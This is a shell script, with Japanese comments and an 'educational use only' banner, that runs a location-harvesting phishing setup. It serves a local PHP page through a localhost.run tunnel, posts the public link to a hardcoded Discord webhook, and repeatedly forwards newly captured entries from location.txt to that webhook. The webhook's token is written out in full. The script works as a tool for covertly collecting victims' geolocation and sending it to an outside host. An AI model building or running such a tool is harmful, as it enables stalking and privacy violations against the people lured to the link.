#!/bin/sh

clear

echo "╔══════════════════════════════════════╗"
echo "║ 🌸 開発者: Devcode                  ║"
echo "║ ⚠️  本ツールは教育目的でのみ使用可能    ║"
echo "╚══════════════════════════════════════╝"

echo "📦 パッケージをインストール中です..."
apk update > /dev/null 2>&1
apk add php php-cli curl openssh grep inotify-tools > /dev/null 2>&1

echo "🚀 PHPサーバーを起動中（ポート: 8080）..."
php -S localhost:8080 > /dev/null 2>&1 &
php_pid=$!
sleep 2

echo "🌐 トンネル起動中（localhost.run）..."
yes yes | ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:8080 nokey@localhost.run > .log 2>&1 &
ssh_pid=$!
sleep 5

url=$(grep -o 'https://[^ ]*\.lhr\.life' .log | head -n 1)
echo "✨ 発行URL: $url"

webhook_url="https://discordapp.com/api/webhooks/1356867692899860557/anLF-C2F9gOlPyjCgnJm5B1F5yWARixCnRYA6cXmCOXyVvLvOY2WQOjN03QOp5TQzT3x"
json="{\"content\": \"🔔 URLが発行されました\n$url\"}"
curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" > /dev/null 2>&1

# 取得情報の通知ループ
echo "👀 location.txtの監視を開始します..."

last_line=""

while true; do
    if [ -f location.txt ]; then
        new_line=$(tail -n 2 location.txt | tr '\n' '\\' | sed 's/\\$//')
        if [ "$new_line" != "$last_line" ] && [ -n "$new_line" ]; then
            last_line="$new_line"
            json="{\"content\": \"🆕 新しい位置情報が取得されました:\n${new_line//\"/\\\"}\"}"
            curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" > /dev/null 2>&1
            echo "📤 Discordに通知しました: $new_line"
        fi
    fi
    sleep 2
done &

monitor_pid=$!

trap 'echo "🛑 停止中..."; kill $php_pid $ssh_pid $monitor_pid; exit 0' INT
wait
